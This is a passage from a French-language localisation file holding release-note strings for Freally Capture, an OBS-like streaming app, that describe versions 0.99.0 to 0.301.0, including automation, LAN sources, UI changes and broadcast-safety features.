diffusez.","changelog.266a45108853":"<strong>Ouvrir un projecteur figeait tout le bureau.</strong> Ouvrir un projecteur sur un écran demandait au système le plein écran exclusif <em>pendant la création de la fenêtre</em> sur l'écran principal, ce qui bloquait la boucle d'événements de Windows — le bureau se figeait et il fallait tuer l'application depuis le Gestionnaire des tâches. Les projecteurs sont désormais une <strong>fenêtre sans bordure dimensionnée à l'écran choisi</strong> (ce qu'est réellement le « projecteur plein écran » d'OBS) : aucun changement de mode DWM, et Esc / Alt+F4 / la barre des tâches continuent de fonctionner.","changelog.5f6fa8c04556":"<strong>L'import de scènes OBS ne sélectionnait pas la caméra.</strong> Un périphérique de capture vidéo importé depuis OBS arrivait sur « (périphérique actuel) » sans rien de sélectionné — l'importateur abandonnait entièrement le périphérique d'OBS. Il reprend désormais le nom convivial du périphérique dans OBS et le fait correspondre à la caméra de cette machine lors de l'import.","changelog.7dca8f4d0d7f":"<span class=\"release__meta\"><span class=\"release__ver\">v0.301.0</span><time class=\"release__date\" datetime=\"2026-07-14\">2026-07-14</time></span><span class=\"release__title\">(Barre de menus et fenêtre Paramètres)</span>","changelog.080821dda5da":"L'habillage d'une application de bureau, à la manière d'OBS mais propre à Freally : une vraie <strong>barre de menus</strong> en haut et une <strong>fenêtre Paramètres à barre latérale</strong> avec OK / Annuler / Appliquer — le dock Contrôles redevient ainsi un ensemble de commandes en direct au lieu d'un mur de boutons de lancement.","changelog.8a7238deca0a":"<strong>Barre de menus de l'application</strong> — Fichier · Édition · Affichage · Docks · Profil · Collection de scènes · Outils · Aide, en haut de la fenêtre. C'est une simple couche de distribution au-dessus d'actions qui existaient déjà (celles de la palette de commandes) : rien de nouveau ne se passe en coulisses — les lanceurs ont simplement trouvé leur place. Fichier donne accès à Afficher les enregistrements / Remux / Paramètres / Afficher le dossier des paramètres / Quitter ; Édition propose annuler-rétablir et le copier/coller de la transformation et des filtres ; Outils rassemble l'automatisation, le conducteur, la carte des raccourcis, la synchro A/V, les scripts, les composants, MIDI, PTZ, l'API distante et le panneau LAN ; Profil et Collection de scènes passent d'un ensemble enregistré à l'autre ; Aide ouvre la documentation, le journal des modifications, un rapport de bug et la vérification des mises à jour. Les menus déroulants se parcourent au clavier (touches fléchées entre les menus et à l'intérieur) et sont étiquetés pour les lecteurs d'écran ; les éléments des fonctionnalités qui n'existent pas encore sont présents mais désactivés.","changelog.0a8800013b15":"<strong>Fenêtre Paramètres à la manière d'OBS</strong> — une barre latérale de catégories à gauche (<strong>Général · Apparence · Diffusion · Sortie · Replay · Raccourcis · Réseau · Accessibilité · À propos</strong>) avec un volet groupé et défilant, et un pied de fenêtre <strong>OK / Annuler / Appliquer</strong>. <strong>Rien ne change tant que vous n'avez pas cliqué sur Appliquer (ou OK) :</strong> la fenêtre modifie une copie privée, Appliquer reste grisé tant que vous n'avez rien changé, et Annuler/Escape restaure exactement ce que vous aviez — le thème et la couleur d'accent sont prévisualisés en direct tant qu'elle est ouverte, mais reviennent en arrière à l'annulation, sans laisser de trace. Une erreur dans une catégorie s'affiche sur place, avec un point sur son entrée de la barre latérale.","changelog.0b27c918454f":"<strong>Attribution des raccourcis sans conflit</strong> — la catégorie Raccourcis attribue chaque action à partir d'une <strong>liste déroulante de raccourcis présélectionnés</strong>, et non d'une zone de texte. Choisir un raccourci pour une action le retire du menu de toutes les autres, si bien que deux fonctionnalités ne peuvent jamais partager la même touche ; <strong>Aucun</strong> supprime l'attribution et remet le raccourci dans la réserve. Un champ de filtre réduit la liste. La saisie libre a entièrement disparu, et le backend rejette désormais structurellement les accélérateurs mal formés : une attribution absurde ne peut pas être enregistrée, même en modifiant le fichier à la main.","changelog.757f7265a0b3":"<strong>Accessibilité : couleurs des vumètres de la console</strong> — la nouvelle catégorie Accessibilité règle les couleurs des bandes des vumètres, avec un <strong>préréglage adapté au daltonisme</strong> (Okabe-Ito) à côté de Par défaut et d'une option Personnalisé.","changelog.bc44a26e0073":"<strong>Raccourcis vers les dossiers de l'application</strong> — Fichier → Afficher les enregistrements / Afficher le dossier des paramètres ouvrent les dossiers propres à l'application dans l'explorateur de fichiers (une commande dédiée, jamais un chemin brut venant de la webview).","changelog.a8559338a320":"<strong>Le dock Contrôles ne contient plus que des commandes.</strong> Les 18 boutons de lancement de boîtes de dialogue (Paramètres, Sortie, Stream, Docks, Profils, Scripts, Automatisation, Signaler un bug, Vérifier les mises à jour, …) sont passés dans la barre de menus ; le dock ne garde que ce qui pilote la diffusion — Démarrer/Arrêter l'enregistrement, Passer en direct, Armer le replay, le bouton panique, le mode Studio, les transitions. Les invites de rapport de plantage et de mise à jour disponible apparaissent toujours au lancement, exactement comme avant.","changelog.2ce026bd331e":"<span class=\"release__meta\"><span class=\"release__ver\">v0.300.1</span><time class=\"release__date\" datetime=\"2026-07-14\">2026-07-14</time></span><span class=\"release__title\">(La passe de simplification de la phase 2)</span>","changelog.82f024d54659":"Aucune nouvelle fonctionnalité : une revue de nettoyage sous quatre angles (réutilisation / simplification / efficacité / niveau d'abstraction) des changements de 0.300.0, appliquée. Un correctif visible l'accompagne : le <strong>compositeur d'affichage de l'incrustation des entrées</strong> utilisait encore l'ancien mélange alpha d'avant le correctif, si bien que les bords des glyphes dessinés sur de la transparence ressortaient légèrement sombres — il partage désormais le <code>compose::blit</code> corrigé avec toutes les autres sources dessinées.","changelog.5d482d56004f":"<strong>Mise en commun de ce que 0.300.0 avait construit puis contourné.</strong> Les quatre blits alpha écrits à la main appellent désormais un seul compositeur ; la limitation de la recherche, le décodage des échantillons audio et le chien de garde des processus enfants n'existent plus qu'une fois, dans <code>media.rs</code> (média, playlist, replay et réception LAN les adoptent tous) ; les quatre registres de sessions faibles ne font plus qu'un <code>WeakRegistry</code> ; la grammaire <code>{{variable}}</code> est UNE seule fonction partagée par les titres et le moteur d'automatisation (ils ne peuvent plus diverger) ; le formulaire de réception LAN, le rendu des QR codes, les valeurs par défaut des calques de titre et les tables d'options sont chacun un module d'interface partagé unique ; la détection de l'IP du réseau local, l'encodeur JPEG de l'émetteur Link et la lecture aléatoire de la playlist appellent tous les fonctions utilitaires qui existaient déjà au lieu d'en transporter des copies.","changelog.9f9c71653770":"<strong>Hygiène du temps réel.</strong> La prise du visualiseur dans la console n'alloue plus de mémoire à chaque bloc de 10 ms ; l'émetteur Freally Link écrit les images en-tête puis charge utile au lieu de copier chaque image JPEG du programme dans un tampon intermédiaire ; le chronomètre de splits calcule sa colonne de comparaison une fois par session au lieu de le faire à chaque rafraîchissement ; la vérification d'état de la réception LAN a cessé de reconvertir l'identifiant de la source en chaîne à chaque image traitée.","changelog.b393d51bd0f8":"Diverses surfaces mortes supprimées (un champ de manette jamais lu, des derives inutilisés, des fonctions utilitaires trop publiques) et les prologues d'arguments et sondages ffmpeg dédupliqués dans le module de décodage — des commandes identiques à l'octet près, écrites une seule fois.","changelog.b1d50dd41d90":"<strong>Le programme d'installation Windows crée désormais un raccourci sur le Bureau.</strong> Le modèle NSIS de Tauri ne crée qu'une entrée dans le menu Démarrer et ne propose aucune option de raccourci sur le bureau, si bien qu'aucune installation n'avait jamais placé d'icône sur le Bureau — les hooks de l'installateur créent désormais <code>Freally Capture.lnk</code> (avec l'icône de l'application) à chaque installation et le suppriment à la désinstallation.","changelog.45faf29e220b":"<strong>Les repères d'alignement s'effacent désormais en un clic.</strong> Supprimer un repère obligeait à faire glisser une ligne de 1 pixel hors du canevas — un travail de précision où un raté déclenche plutôt le déplacement d'un élément (dont les lignes magnétiques magenta passaient alors pour « un nouveau repère est apparu », un cas signalé en conditions réelles). La barre d'outils des repères gagne un bouton <strong>Effacer tous les repères</strong>, et la zone de saisie autour de chaque repère est plus large.","changelog.cb705b484db4":"<span class=\"release__meta\"><span class=\"release__ver\">v0.300.0</span><time class=\"release__date\" datetime=\"2026-07-14\">2026-07-14</time></span><span class=\"release__title\">(Nouvelles sources et incrustations — CAP-N, phase 2)</span>","changelog.3d36dd2cf7da":"<strong>Dix nouveautés à placer sur le canevas — toutes locales.</strong> Le ralenti instantané fait passer le tampon <em>dans</em> l'émission, une playlist média sans blanc remplace la source média « un fichier à la fois », les titres et les tableaux de score gagnent un véritable concepteur en calques avec contrôle en direct, et le canevas gagne un visualiseur audio, un HUD de performances, un chronomètre de splits pour le speedrun, une incrustation des entrées et des effets de curseur. Deux sources en réseau local complètent l'ensemble : un récepteur SRT/RTMP pour qu'un téléphone ou un second PC alimente une scène, et <strong>Freally Link</strong>, un partage d'instance à instance propre à l'application qui n'a besoin de ffmpeg d'aucun côté.","changelog.a446e2cc5c22":"<strong>L'invariant réseau est respecté :</strong> les deux fonctionnalités réseau local sont <strong>désactivées tant que vous ne les ajoutez pas</strong>, n'écoutent que sur la machine locale et ne touchent jamais Internet. Rien ne fait de découverte, rien n'appelle l'extérieur, et l'application le dit dans toutes les langues. L'incrustation des entrées et les effets de curseur ne lisent les entrées <strong>que lorsqu'ils sont activés</strong> et n'enregistrent ni ne stockent jamais une frappe.","changelog.69585a9a3335":"<strong>Source de lecture du ralenti instantané</strong> (CAP-N10). Faites passer le tampon de replay armé directement dans le programme : un raccourci capture les N dernières secondes (copie de flux — aucun réencodage) et les lit à 100 / 50 / 25 %, <strong>avec un nouveau minutage, jamais d'interpolation d'images</strong>. Naviguez et mettez en pause pendant la lecture ; à la fin, la source redevient transparente, et l'émission revient d'elle-même au direct. <em>Le ralenti est muet par conception — un son reminuté serait étalé, et nous ne le simulons pas.</em>","changelog.beabb5e2e26f":"<strong>Source de réception en réseau local</strong> (CAP-N11). Un <strong>récepteur SRT/RTMP</strong> intégré : pointez n'importe quelle application caméra de téléphone, encodeur ou second PC vers l'URL (affichée avec un QR code) et le flux arrive dans une scène avec sa propre tranche dans la console. Désactivée tant qu'elle n'est pas ajoutée, elle n'écoute que sur la machine locale, jamais sur Internet. SRT accepte une phrase secrète facultative (AES) ; <em>RTMP n'a pas d'authentification propre — le formulaire le dit et recommande SRT.</em>","changelog.26a004c0fb53":"<strong>Freally Link</strong> (CAP-N12). Deux instances Freally sur un même réseau local : activez la sortie Link sur la machine émettrice et définissez sa <strong>clé d'appairage</strong> (la sortie ne peut pas être activée sans), cliquez sur <strong>Scanner le réseau local</strong> sur la machine réceptrice, saisissez la clé, et le programme apparaît comme une source — du PC de jeu au PC d'encodage, ou vers un écran dans une salle annexe. Un récepteur incapable de présenter la clé ne voit jamais une seule image (comparaison en temps constant, une erreur honnête « refusé » au lieu d'une boucle de tentatives). Un protocole réseau propre, écrit à la main, et une découverte mDNS : <strong>aucun ffmpeg nécessaire de part et d'autre</strong>, aucun broker, aucun serveur.","changelog.d57b39d01af7":"<strong>Source d'incrustation des entrées</strong> (CAP-N13). Visualisation en direct du clavier, de la souris et de la manette avec quatre dispositions (WASD, clavier compact, manette à deux sticks, stick arcade 8 directions) — les touches pressées s'allument, les clics clignotent, les sticks et les gâchettes bougent. <strong>Ne lit les entrées que lorsque la source est activée, et n'enregistre ni ne stocke jamais rien.</strong> Clavier et souris sont d'abord pris en charge sous Windows (ce que le produit dit honnêtement) ; les manettes fonctionnent sur les trois systèmes.","changelog.230d75e66779":"<strong>Source d'incrustation des statistiques système</strong> (CAP-N14). Les <em>chiffres réellement mesurés</em> du dock de statistiques — fps, CPU, mémoire, temps de composition GPU, images perdues et débit en direct — composités pour vos spectateurs, avec une option par ligne. <em>L'utilisation du GPU est volontairement absente : nous ne la mesurons pas, donc nous ne la devinons pas.</em>","changelog.7d975b57ccd9":"<strong>Source de visualiseur audio</strong> (CAP-N15). Des barres de spectre FFT classiques, un oscilloscope ou des vumètres stéréo, liés à n'importe quelle tranche de la console, à un bus de piste ou au mix master. Prélevé <strong>après le fader</strong> — une source coupée s'affiche à plat, exactement comme elle sonne. FFT radix-2 maison ; aucun apprentissage automatique nulle part.","changelog.dcc7f22ee0b8":"<strong>Concepteur de titres et de tableaux de score</strong> (CAP-N16). Des modèles en calques (texte, image, forme) avec texte à contour et ombre portée, animations d'entrée et de sortie (fondu, glissement, volet), des champs liés à un fichier surveillé (cellule CSV, pointeur JSON) ou à une variable du studio, et un contrôle en direct — changez un nom, modifiez le score, lancez l'animation — sans toucher à la scène.","changelog.977703b6d007":"<strong>Source playlist média</strong> (CAP-N17). Une playlist ordonnée qui joue <strong>réellement sans blanc</strong> (toute la liste découpée passe par un seul décodage, si bien que les limites entre éléments sont exactes à l'image près), avec points d'entrée/sortie et points de repère par élément, boucle / aléatoire / maintien du dernier, raccourcis suivant-précédent, et une variable « en cours de lecture » que n'importe quelle source Texte peut afficher.","changelog.ded0bd268198":"<strong>Source chronomètre de splits pour le speedrun</strong> (CAP-N18). Importez un fichier LiveSplit <code>.lss</code> et lancez-le : comparaisons avec le record personnel, les meilleurs segments ou la moyenne, mise en évidence des segments en or, et raccourcis globaux pour split / annuler / sauter / réinitialiser. Le fichier est <strong>uniquement</strong> lu — une course n'y est jamais réécrite. <em>Les auto-splitters qui lisent la mémoire des processus ne sont volontairement pas pris en charge (trop proches du terrain de l'anti-triche) ; le découpage se fait par fichier et par raccourci.</em>","changelog.c303cbf74e59":"<strong>Mise en évidence du curseur et effets de clic</strong> (CAP-N19). Un halo autour du curseur, des ondes de clic gauche/droit codées par couleur et un affichage facultatif des touches, dessinés sur les captures d'écran et de fenêtre — l'indispensable des créateurs de tutoriels, sur le chemin de curseur propre à l'application. Windows uniquement, honnêtement (macOS et Linux composent leur propre curseur) ; les frappes sont dessinées, jamais enregistrées.","changelog.f998b484bc62":"<strong>La mise à l'échelle bilinéaire nette était plus floue que la bilinéaire simple</strong> (régression du CAP-N70 de 0.200.0). Le shader mesurait les <em>bords</em> des texels plutôt que leurs centres, si bien que l'essentiel de chaque texel tombait dans le mélange 50/50 de la bordure. Il conserve désormais le centre de chaque texel et passe à son voisin dans une jointure étroite, ce qui est précisément le but de ce mode. Les nouveaux tests sur images de référence pour chaque algorithme de mise à l'échelle (dus depuis 0.200.0) le verrouillent.","changelog.e64eb694c7c5":"Remarque sur l'empaquetage","changelog.7a371e20c4e6":"<strong>Le MSI Windows porte en interne la ProductVersion <code>0.230.0</code>.</strong> Windows Installer plafonne la version mineure d'un MSI à 255, ce que dépasse l'échelon 0.300.0 — la première version où le schéma « +100 par phase » rencontre cette limite. La correspondance est <code>MSI minor = 200 + app-minor ÷ 10</code> (0.400.0 → <code>0.240.0</code> … 0.900.0 → <code>0.290.0</code>, puis 1.0.0 → <code>1.0.0</code>), strictement croissante pour que les mises à niveau MSI continuent de remplacer les anciennes installations. Seule la version interne du MSI diffère : l'application, le programme d'installation NSIS, l'outil de mise à jour et À propos indiquent tous <strong>0.300.0</strong>.","changelog.04f0b1865198":"<span class=\"release__meta\"><span class=\"release__ver\">v0.200.0</span><time class=\"release__date\" datetime=\"2026-07-13\">2026-07-13</time></span><span class=\"release__title\">(Automatisation + capture et périphériques en profondeur — CAP-N, phases 1 et 9)</span>","changelog.685bf42fe455":"Deux phases thématiques dans une seule version : le numéro franchit donc deux échelons (0.99.0 → 0.200.0). <strong>Phase 1 — Automatisation</strong> permet au studio de se piloter tout seul : un moteur de règles, des macros avec variables, des surfaces de contrôle MIDI et OSC, des accords et des couches de raccourcis, un panneau tactile en réseau local, un service de voyants tally, le contrôle des caméras PTZ et un conducteur d'émission minuté. <strong>Phase 9 — Capture et périphériques en profondeur</strong> achève le chemin de l'entrée jusqu'au canevas : un moniteur de passthrough à faible latence, une mise à l'échelle au pixel près, le zoom de recadrage, le rognage automatique des bandes noires, la liaison automatique fenêtre↔audio de l'application et le mappage de tons HDR→SDR. Livrée avec l'<strong>arrière-plan de scène</strong> et la <strong>vraie lecture des médias à l'envers</strong> développés plus tôt dans le cycle.","changelog.79232fa7e8c0":"<strong>Toute la surface d'automatisation partage un même invariant de conception :</strong> chaque règle, macro, pad MIDI, adresse OSC, bouton de panneau et étape du conducteur passe par une seule liste fixe de commandes autorisées — celle-là même qu'expose l'API distante WebSocket. Aucune surface de contrôle ne peut désigner un fichier, lancer un processus ou atteindre Internet, <strong>par construction</strong>, et chaque surface réseau est désactivée par défaut et n'écoute que sur la boucle locale, sauf si le réseau local est explicitement activé.","changelog.9bb9593116bc":"<strong>Arrière-plan / fond d'écran de scène.</strong> Épinglez n'importe quelle image, GIF en boucle ou vidéo en boucle derrière la capture, en arrière-plan plein canevas ou demi-écran (gauche / droite / haut / bas), la capture se plaçant automatiquement dans l'autre moitié. Zoom à la molette sur la capture ou sur l'arrière-plan, un filtre de retournement en temps réel, un mode « attendre le début de l'enregistrement » avec aperçu avant enregistrement, et une bascule afficher/masquer pour qu'une vidéo de tutoriel puisse être lue en plein cadre avant le retour de la capture.","changelog.3cc0eae313a7":"<strong>Vraie lecture des médias à l'envers + transport complet.</strong> Un véritable rendu inversé (mémoire bornée, segmenté, mis en cache), plus la navigation, la recherche depuis n'importe quel point, lecture/pause et une bascule de boucle — une vidéo d'arrière-plan se comporte comme un lecteur ordinaire, au signal de l'opérateur.","changelog.e9af708a1747":"<strong>Moteur de règles d'automatisation</strong> (CAP-N01). Neuf déclencheurs sur front — changement de scène, état du stream, état de l'enregistrement, erreur de source, franchissement d'un niveau audio, inactivité du système, focus d'une fenêtre, heure de la journée et modification d'un fichier surveillé — soumis à des conditions (une variable égale à une valeur, diffusion en cours, enregistrement en cours) qui exécutent des actions du studio. Chaque règle est livrée <strong>désactivée</strong> ; le moteur ne fait rien tant qu'aucune n'est activée.","changelog.cdab0d32015e":"<strong>Macros, variables et séquences</strong> (CAP-N02). Des séquences d'étapes nommées (exécuter une action, attendre, définir une variable) avec un nombre de répétitions et un raccourci global facultatif, exécutables depuis l'interface, un raccourci, une règle ou l'API distante. Les <strong>variables</strong> du studio insèrent <code>{{name}}</code> dans n'importe quelle source Texte et la mettent à jour en direct dès qu'une macro définit la valeur.","changelog.d7decf42ec57":"<strong>Surfaces de contrôle MIDI</strong> (CAP-N03). Associez par apprentissage MIDI un pad, un potentiomètre ou un fader à une action du studio, une macro, un changement de scène, un fader de la console ou une coupure du son, avec un <strong>retour sur les LED et les faders motorisés</strong> qui reflète l'état réel du studio (le pad REC s'allume parce que vous enregistrez). Aucun port MIDI ne s'ouvre tant qu'aucun n'est choisi.","changelog.3f509d62695d":"<strong>Contrôle OSC</strong> (CAP-N04). Les contrôleurs de la classe de TouchOSC et les consoles d'éclairage pilotent le studio via Open Sound Control — <code>/scene/switch</code>, <code>/record/start</code>, <code>/macro/run</code>, <code>/mixer/vol</code>, et d'autres. Désactivé par défaut, en boucle locale sauf si le réseau local est activé. <em>OSC n'a pas d'authentification propre — la bascule réseau local le signale.</em>","changelog.e19b0ee81809":"<strong>Accords et couches de raccourcis</strong> (CAP-N05). Des accords en deux temps (<code>Ctrl+K, 3</code>), où la seconde touche seule n'est réservée que pendant que l'accord est en attente, plus des couches persistantes pour qu'un petit clavier pilote de nombreuses actions.","changelog.012efed7e76a":"<strong>Panneau tactile en réseau local</strong> (CAP-N06). L'application sert une page de contrôle — boutons de scène avec tally en direct, faders de la console et touches d'action — à n'importe quel téléphone du réseau, accessible par un QR code. Désactivé par défaut, un mot de passe à chaque requête, en boucle locale sauf si le réseau local est activé, et la page est intégrée (rien n'est téléchargé depuis Internet).","changelog.6784a15679f3":"<strong>Service de voyants tally</strong> (CAP-N07). Une page de tally rouge/vert plein écran que n'importe quel téléphone inutilisé peut afficher ; <code>?scene=NAME</code> surveille une scène, sinon la page suit l'état en direct du programme.","changelog.0b65086c92dd":"<strong>Contrôle des caméras PTZ</strong> (CAP-N08). Panoramique / inclinaison / zoom des caméras en VISCA over IP, avec des préréglages nommés et un rappel automatique par scène (une scène qui passe au programme rappelle le plan qui lui est associé). Réseau local uniquement ; une caméra n'existe que parce que son adresse a été saisie — rien n'est découvert.","changelog.23f2bea95258":"<strong>Conducteur d'émission</strong> (CAP-N09). Une playlist ordonnée d'étapes — une scène et sa durée, plus des actions facultatives — avec avancement manuel ou automatique et un affichage en direct « à suivre + temps restant ». Dérouler un conducteur change de scène de la manière ordinaire, annulable ; il ne modifie jamais la collection de scènes.","changelog.2e60fbc8afc7":"<strong>Moniteur de passthrough à faible latence</strong> (CAP-N69). Un projecteur qui affiche les images <strong>brutes</strong> d'un périphérique de capture — sans scènes, sans filtres, sans compositeur — avec une mesure de la latence capture→affichage, pour qu'on puisse suivre le flux de jeu d'une carte d'acquisition avec un délai minimal.","changelog.0e3a7f16e7d8":"<strong>Modes de mise à l'échelle au pixel près</strong> (CAP-N70). Mise à l'échelle par élément lissée, au plus proche voisin, alignée sur des multiples entiers ou bilinéaire nette — les contenus rétro et pixel art arrivent sur le canevas sans flou.","changelog.ffa3f0ee68cd":"<strong>Zoom de recadrage et panoramique de suivi</strong> (CAP-N71). Zoomez à la molette dans n'importe quelle capture avec une animation à amortissement critique, trois préréglages par raccourci et un mode de suivi facultatif qui suit le curseur.","changelog.d331c3ab49e3":"<strong>Rognage automatique des bandes noires</strong> (CAP-N72). Détectez et rognez les bandes letterbox/pillarbox d'une source, en une fois ou en continu à mesure que le format du contenu change.","changelog.c5425a9fc61b":"<strong>Liaison automatique fenêtre↔audio de l'application</strong> (CAP-N73). Capturez l'audio de l'application d'une fenêtre en même temps que celle-ci ; masquer la fenêtre coupe la tranche liée et l'afficher la réactive — sans jamais écraser une coupure manuelle.","changelog.372de0cef652":"<strong>Mappage de tons HDR→SDR pour la capture</strong> (CAP-N74). Adaptez la sortie d'un écran HDR au canevas SDR (écrêtage / maxRGB préservant la teinte / Reinhard / genou BT.2408) avec un niveau de blanc de référence réglable, ajusté en direct pour chaque écran sans redémarrer la capture.","changelog.1ee387582d9c":"Sécurité et fiabilité","changelog.647e3c52982e":"Chaque surface d'automatisation passe par la liste d'autorisation partagée de l'API distante (<code>ALLOWED_COMMANDS</code>) : aucune règle, macro, association MIDI/OSC, bouton de panneau ou étape de conducteur ne peut atteindre une commande que les propres boutons de l'application n'atteignent pas — ce que vérifie un test garantissant que la liste d'autorisation et ses branches de distribution ne peuvent pas diverger.","changelog.3ebb5ae804a8":"Le déclencheur <code>FileChanged</code> respecte la protection existante des chemins distants : surveiller un fichier ne sonde donc jamais un chemin UNC (aucune fuite d'identifiants NTLM).","changelog.894554d366f3":"Les deux surfaces de contrôle en réseau local (panneau, OSC) avertissent dans les Paramètres que le trafic sur le réseau local n'est pas chiffré, avant que le port ne s'ouvre au réseau.","changelog.f8d204cd91ea":"<span class=\"release__meta\"><span class=\"release__ver\">v0.99.0</span><time class=\"release__date\" datetime=\"2026-07-12\">2026-07-12</time></span><span class=\"release__title\">(Sources, périphériques et calibrage — CAP-M, lot 3)</span>","changelog.26f64316b751":"Le troisième et dernier lot d'indispensables : tout ce qui se trouve entre l'entrée et le canevas. Des signaux de test intégrés et un atelier guidé de synchro A/V pour calibrer toute la chaîne ; des sources minuteur/horloge et texte lié à un fichier pour les émissions qui reposent sur des données ; une carte des raccourcis qui vérifie chaque attribution ; les fonctions manquantes de la console ; et une vraie profondeur côté périphériques — désentrelacement et réglages de caméra multiplateformes avec des profils par périphérique.","changelog.bc670f3d3c34":"<strong>Sources de signaux de test</strong> (CAP-M21). Mires de barres de couleur de type SMPTE, une grille/quadrillage de calibrage, un balayage de mouvement, la tonalité de référence à 1 kHz (−20 dBFS) et un motif combiné <strong>flash+bip de synchro A/V</strong> généré à partir d'une seule horloge — vérifiez scènes, encodeurs, projecteurs et destinations de stream sans aucune caméra branchée.","changelog.5c359f960e3e":"<strong>Un atelier de calibrage de la synchro A/V</strong> (CAP-M20). Un outil guidé qui joue le motif flash+bip sur votre écran et vos haut-parleurs, observe votre caméra et votre micro le capter en retour, mesure le décalage par pur traitement du signal (détection d'attaques sur plusieurs cycles, avec des conseils honnêtes en cas d'échec — pièce sombre, micro muet, bruit ambiant qui n'est pas le motif) et propose d'appliquer le résultat au décalage de synchro du micro. Le curseur manuel reste disponible en solution de repli. Honnêteté de la boucle : la latence de votre écran et de vos haut-parleurs fait partie de ce qui est mesuré.","changelog.5f3aaabe7c80":"<strong>Sources minuteur et horloge</strong> (CAP-M15). Une famille de sources de texte : horloge murale (formats strftime + décalage UTC fixe), compte à rebours (vers une durée ou la prochaine heure murale, avec une action à zéro — faire clignoter l'affichage ou changer de scène), chronomètre progressif, et temps écoulé depuis le passage en direct / depuis le début de l'enregistrement. Démarrage/pause/réinitialisation depuis les propriétés de la source ou deux nouveaux raccourcis globaux (tous les minuteurs à la fois). L'affichage n'est redessiné que lorsque son texte change.","changelog.e4a01e4da67e":"<strong>Texte depuis un fichier + liaison de données</strong> (CAP-M16). Une source Texte peut se lier à un fichier local surveillé : le <code>.txt</code> entier, une cellule CSV (nom d'en-tête ou index) ou une valeur JSON (pointeur RFC 6901) — relu dans la demi-seconde qui suit une modification, et tolérant envers les éditeurs à écriture atomique (fichier temporaire + renommage), puisque la dernière valeur valide reste à l'écran. La base des tableaux de score et des bandeaux de titre, sans aucun service. L'importateur OBS prend désormais aussi en charge « lire depuis un fichier ».","changelog.99703cca8970":"<strong>Une carte des raccourcis</strong> (CAP-M14). Un seul tableau, avec recherche et filtres, de <strong>toutes</strong> les attributions — actions globales et Appuyer pour parler / Appuyer pour couper par source — avec des signaux de conflit honnêtes : le même accord écrit de deux façons est signalé comme partagé, et une touche que le système a refusé d'enregistrer (prise par une autre application, ou indisponible sur ce compositeur) le dit. Exporte une antisèche en Markdown dans Téléchargements. Paramètres → Raccourcis attribue ; cet outil vérifie et documente.","changelog.ee68b38bf053":"<strong>Console complète : panoramique, solo, mono</strong> (CAP-M19). <strong>Balance</strong> stéréo par tranche (le centre est identique au bit près à l'absence de panoramique), <strong>solo PFL</strong> (le monitoring n'entend que les tranches en solo — le mix du programme ne change jamais) et <strong>réduction en mono</strong> par source.","changelog.7ab38b03302e":"<strong>Désentrelacement des sources de périphériques</strong> (CAP-M17). Par périphérique : rejet / bob / linéaire / fusion / adaptatif au mouvement (de la classe de yadif), avec choix de l'ordre des trames — uniquement sur le CPU, dans le thread de capture, identique sur chaque système. Changer de mode redémarre le périphérique, comme un changement de format.","changelog.10b030797364":"<strong>Réglages de caméra avec profils par périphérique</strong> (CAP-M18). Exposition, balance des blancs, mise au point, zoom, gain (et plus encore) pour les webcams et les cartes d'acquisition par un seul chemin multiplateforme — UVC via les API natives sous Windows et Linux ; macOS expose ce que rapporte AVFoundation, c'est-à-dire souvent rien, et le panneau le dit honnêtement. Chaque réglage est enregistré dans un profil par périphérique qui est réappliqué au branchement à chaud et au redémarrage.","changelog.1d38d97fe470":"<span class=\"release__meta\"><span class=\"release__ver\">v0.98.0</span><time class=\"release__date\" datetime=\"2026-07-12\">2026-07-12</time></span><span class=\"release__title\">(Sécurité et fiabilité de diffusion — CAP-M, lot 2)</span>","changelog.4b98f0291de5":"Le deuxième lot d'indispensables : <em>ne pas perdre l'émission</em>. Le studio détecte désormais les défaillances avant que vous passiez en direct (une check-list avant le direct), pendant le direct (des alarmes de sécurité toujours actives, un basculement d'encodeur en cours de session, un tableau de bord de l'état des sources) et après le pire (des enregistrements qui résistent aux plantages avec une réparation au lancement suivant, une protection à la fermeture qui finalise tout dans l'ordre). Et quand vous devez tout masquer <em>immédiatement</em>, il y a un bouton panique.","changelog.f4de38fb000e":"<strong>Modèles de nom de fichier d'enregistrement</strong> (CAP-M25). Un nommage à base de jetons — <code>{prefix}</code>, <code>{date}</code>, <code>{time}</code>, <code>{scene}</code>, <code>{profile}</code>, <code>{canvas}</code>, <code>{marker-count}</code> et un <code>{counter}</code> persistant — pour les enregistrements, les sauvegardes de replay et les images fixes, avec un suffixe automatique qui évite les collisions et des <strong>dossiers par sortie</strong> pour les replays et les images fixes. Les noms sont débarrassés des caractères réservés de chaque plateforme ; une faute de frappe dans un modèle est détectée à l'enregistrement.","changelog.4750f9f5b2ce":"<strong>Un tableau de bord de l'état des sources</strong> (CAP-M13). Un seul panneau, ouvert depuis la palette, avec l'état en direct de chaque source, ses fps, l'<strong>âge de la dernière image</strong>, le nombre d'images perdues et l'historique des redémarrages — plus Redémarrer et Propriétés pour chaque source. Les sources que le moteur ne fait pas tourner indiquent honnêtement « inactive ».","changelog.977c064d0ab7":"<strong>Une protection à la fermeture + un arrêt ordonné</strong> (CAP-M23). Fermer le studio pendant un direct, un enregistrement ou avec le replay armé demande d'abord confirmation — en listant exactement ce qui va se passer — puis termine le stream, finalise l'enregistrement et vide le tampon de replay <strong>dans l'ordre</strong> avant de quitter. Un fichier marqueur de plantage distingue désormais les sorties propres des plantages.","changelog.6102d929f559":"<strong>Des enregistrements qui résistent aux plantages + une invite de récupération</strong> (CAP-M11). Les enregistrements mp4/mov sont écrits de façon <strong>fragmentée</strong> (un index écrit à chaque image clé), si bien qu'un plantage ou une coupure de courant laisse un fichier lisible au lieu d'un fichier illisible. Si une session s'interrompt brutalement en plein enregistrement, le lancement suivant propose en un clic l'action <strong>Réparer</strong>, qui produit une copie <code>(repaired)</code> — l'original n'est jamais touché.","changelog.9d1b1cce6db8":"<strong>Basculement d'encodeur en cours de session</strong> (CAP-M12). Si l'encodeur matériel tombe en panne en plein stream ou en plein enregistrement (réinitialisation du pilote, contention du GPU), la session descend à chaud une échelle de repli — l'autre famille matérielle, puis x264 — au lieu de s'arrêter. Le stream s'appuie sur sa reconnexion existante ; l'enregistrement continue dans un nouveau fichier ; une notification honnête + une note persistante dans le dock de statistiques disent exactement ce qui s'est passé. Les pannes réseau ne déclenchent jamais de bascule.","changelog.08f429a15748":"<strong>Alarmes de sécurité de diffusion</strong> (CAP-M10). Des chiens de garde toujours actifs pendant que la sortie tourne : <strong>audio du programme silencieux</strong>, <strong>saturation prolongée</strong>, <strong>image du programme noire ou figée</strong> (vision par ordinateur classique — luminance échantillonnée + différence entre images sur la relecture existante, sans apprentissage automatique) et <strong>prévision de disque 